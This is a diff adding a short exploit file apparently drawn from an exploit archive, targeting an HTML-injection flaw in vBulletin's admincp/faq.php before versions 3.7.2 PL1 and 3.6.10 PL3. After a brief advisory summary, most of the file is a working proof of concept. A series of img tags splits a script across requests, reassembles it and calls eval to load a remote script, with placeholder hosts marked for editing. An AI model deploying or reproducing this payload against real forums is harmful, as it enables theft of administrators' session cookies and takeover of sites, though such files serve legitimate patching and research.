@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/30134/info
+
+vBulletin is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Versions prior to vBulletin 3.7.2 PL1 and 3.6.10 PL3 are vulnerable. 
+
+<html>
+<body>
+<img 
+src="http://http://www.example.com/vB/upload/admincp/faq.php/0?do=<script>/*" 
+/>
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/1?do=*/a%3D&#039;document.wri&#039;/*"
+/>
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/2?do=*/b%3D&#039;te(%22<script
+&#039;/*" />
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/3?do=*/c%3D&#039;src=http://&#039;/*"
+/>
+<!--edit to match your data -->
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/4?do=*/d%3D&#039;http://www.example.com/&#039;/*"
+/>
+<img 
+src="http://http://www.example.com/vB/upload/admincp/faq.php/5?do=*/e%3D&#039;&#039;/*" 
+/>
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/6?do=*/f%3D&#039;t.js></scrip&#039;/*"
+/>
+<!-- end edit -->
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/7?do=*/g%3D&#039;t>%22)&#039;/*" 
+/>
+<img
+src="http://http://www.example.com/vB/upload/admincp/faq.php/8?do=*/h%3Da%2Bb%2Bc%2Bd%2Be%2Bf%2Bg/*"
+/>
+<img 
+src="http://http://www.example.com/vB/upload/admincp/faq.php/9?do=*/eval(h)/*" 
+/>
+<img 
+src="http://http://www.example.com/vB/upload/admincp/faq.php/a0?do=*/</script>" 
+/>
+</body>
+</html>
+
